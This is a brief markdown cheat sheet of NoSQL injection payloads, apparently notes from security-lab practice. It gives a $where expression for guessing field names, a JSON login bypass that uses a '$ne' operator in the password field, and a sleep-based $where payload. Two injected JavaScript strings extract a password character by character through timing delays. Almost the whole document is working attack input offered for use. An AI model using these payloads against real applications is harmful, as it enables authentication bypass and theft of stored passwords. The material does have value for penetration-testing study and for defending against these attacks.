# noSQLi injections

## Guessing field names
If we can add a `$where` to the request.
```json
"$where": "Object.keys(this)[0].match('^FUZZ.*')"
```

## Pass login
```json
{
    "username": "carlos",
    "password": {
        "$ne": "invalid"
    }
}
```

## Timing based error
```json
{
    "$where": "sleep(5000)"
}
```

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```
    
``` 
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```